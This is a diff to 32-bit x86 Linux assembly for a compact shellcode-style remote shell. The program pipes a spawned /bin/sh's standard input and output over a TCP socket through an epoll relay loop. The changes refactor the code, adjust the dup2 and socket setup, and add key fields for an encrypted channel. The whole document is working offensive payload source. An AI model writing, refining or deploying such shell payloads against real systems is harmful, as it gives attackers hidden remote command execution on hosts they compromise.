@@ -80,11 +80,17 @@
 
 %define SHUT_RDWR     1
 
-%define XCHG_KEY_LEN 128 ; 1024-bits
+%define XCHG_KEY_LEN 256 ; 2048-bits
 
 struc epoll_event
   events resd 1
   data   resd 1
+endstruc
+
+struc crypto_ctx
+  ctr  resb  8     ; 64-bit counter + nonce
+  ekey resb 16     ; 128-bit encryption key
+  mkey resb 32     ; 256-bit mac key
 endstruc
          
 struc sc_prop
@@ -96,9 +102,7 @@ struc sc_prop
   evts  resb epoll_event_size
   len   resd 1
   buf   resb BUFSIZ
-  ekey  resb 16         ; encryption key
-  mkey  resb 16         ; mac key 
-  ctr   resb 8          ; counter + nonce  
+  ctx   resb crypto_ctx_size
 endstruc
  
 struc pushad_t
@@ -121,7 +125,7 @@ endstruc
     bits 32
     
 main:    
-_main:    
+_main:
       pushad
       xor    ecx, ecx
       mov    cl, sc_prop_size
@@ -155,15 +159,15 @@ c_pipe:
       ; dup2 (out[1], STDERR_FILENO)      
       ; dup2 (out[1], STDOUT_FILENO)
       ; dup2 (in[0], STDIN_FILENO)   
-      mov    cl, 2                ; ecx = STDERR_FILENO
+      mov    cl, 3                ; ecx = STDERR_FILENO + 1
       mov    ebx, [ebp+p_out+4]   ; ebx = out[1]
 c_dup:
+      dec    ecx               ; becomes STDERR_FILENO, STDOUT_FILENO, then STDIN_FILENO
       push   SYS_dup2
       pop    eax
-      int    0x80 
-      dec    ecx               ; becomes STDOUT_FILENO, then STDIN_FILENO
-      cmove  ebx, [ebp+p_in]   ; replace stdin with in[0] for last call
-      jns    c_dup  
+      int    0x80
+      cmovp  ebx, [ebp+p_in]   ; replace stdin with in[0] for last call
+      jnz    c_dup  
   
       ; close pipe handles in this order..
       ;
@@ -172,15 +176,14 @@ c_dup:
       ; close(out[0]);
       ; close(out[1]);
       mov    esi, ebp          ; esi = p_in and p_out
-      push   4                 ; close 4 handles
-      pop    ecx      
-cls_pipes:
+      mov    cl, 4             ; close 4 handles     
+cls_pipe:
       lodsd                    ; eax = pipes[i]
       xchg   eax, ebx      
       push   SYS_close
       pop    eax 
       int    0x80
-      loop   cls_pipes      
+      loop   cls_pipe      
       
       ; execve("/bin//sh", 0, 0);
       push   SYS_execve
@@ -205,14 +208,15 @@ opn_con:
       int    0x80   
       
       ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);     
+      push   SYS_socketcall
+      pop    eax
+      cdq                      ; edx = 0
       push   SYS_SOCKET
       pop    ebx
       push   edx               ; protocol = IPPROTO_IP
       push   ebx               ; type     = SOCK_STREAM
       push   2                 ; family   = AF_INET
-      mov    ecx, esp          ; ecx      = &args
-      push   SYS_socketcall
-      pop    eax       
+      mov    ecx, esp          ; ecx      = &args      
       int    0x80 
       stosd                    ; save socket
 
@@ -231,15 +235,17 @@ epx_con:
       push   SYS_socketcall
       pop    eax
       int    0x80      
-          
+      ; test   eax, eax
+      ; jle    ??
+      
       ; efd = epoll_create1(0);
       mov    eax, SYS_epoll_create1
       xor    ebx, ebx
       int    0x80
       stosd                    ; save efd
+      
       xchg   eax, ebx          ; ebx = efd
-      pop    edx               ; edx = s
-      add    esp, 4*4          ; fix up stack, removing sa 
+      mov    edx, [ebp+s] 
       clc      
 poll_init:
       ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts);
@@ -252,43 +258,52 @@ poll_init:
       push   EPOLL_CTL_ADD
       pop    ecx
       int    0x80
-      mov    edx, [ebp+p_out]  ; do out[0] next      
+      mov    edx, [ebp+p_out]  ; do out[0] in 2nd loop      
       cmc
-      jc    poll_init      
+      jc     poll_init      
       ; now loop until user exits or some other error      
 poll_wait:
       ; epoll_wait(efd, &evts, 1, -1);
+      mov    ebx, [ebp+efd]
       xor    eax, eax
       mov    ah, 1             ; eax = SYS_epoll_wait
       mov    ecx, edi          ; ecx = evts
-      push   1
+      push   1                 ; edx = 1 event
       pop    edx
-      or     esi, -1
+      or     esi, -1           ; no timeout
       int    0x80
       
       ; if (r <= 0) break;
       test   eax, eax
       jle    cls_sck
       
+      mov    esi, edi
+      lodsd      
       ; if (!(evt & EPOLLIN)) break;
       test   al, EPOLLIN
       jnz    cls_sck
       
-      mov    ebx, [ebp+p_out]
- 
-      ; if (fd == s)
-      cmp    eax, [ebp+s]
+      lodsd
+      mov    ebx, [ebp+p_out] ; ebx = out[0]
+      mov    esi, [ebp+s]     ; esi = s
       
+      ; if (fd == s)
+      cmp    eax, esi
+      jne    do_read
+      
+      mov    ebx, esi          ; ebx = s
+      mov    esi, [ebp+p_in+4] ; esi = in[1]
+do_read:      
       ; len = read(r, buf, BUFSIZ);
       push   SYS_read
       pop    eax
       cdq
-      mov    dl, BUFSIZ    
+      mov    dl, BUFSIZ        ; edx = BUFSIZ
       int    0x80      
-      xchg   eax, ecx               ; ecx = len 
+      xchg   eax, edx          ; edx = len 
       
       ; write(w, buf, len);
-      pop    ebx
+      mov    ebx, esi          ; ebx = out[0] or s
       push   SYS_write
       pop    eax
       int    0x80
@@ -302,11 +317,12 @@ cls_sck:
       int    0x80
 
       clc
-      mov    edx, [ebp+s] ; fd = s
+      mov    edx, ebx ; fd = s
 cls_efd:      
       ; epoll_ctl(efd, EPOLL_CTL_DEL, fd, NULL);
       xor    eax, eax
       mov    al, SYS_epoll_ctl
+      mov    ebx, [ebp+efd]
       push   EPOLL_CTL_DEL
       pop    ecx
       xor    esi, esi
@@ -317,7 +333,7 @@ cls_efd:
       ; close(fd);
       push   SYS_close
       pop    eax
-      mov    ebx, edx
+      mov    ebx, edx      ; ebx = out[0] or s
       int    0x80
       ; do out[0] next      
       mov    edx, [ebp+p_out]
@@ -349,7 +365,7 @@ cls_inout:
       pop    eax      
       mov    ebx, [ebp+p_out]
       int    0x80    
-exit:
+
       ; exit(0);
       push   SYS_exit
       pop    eax 
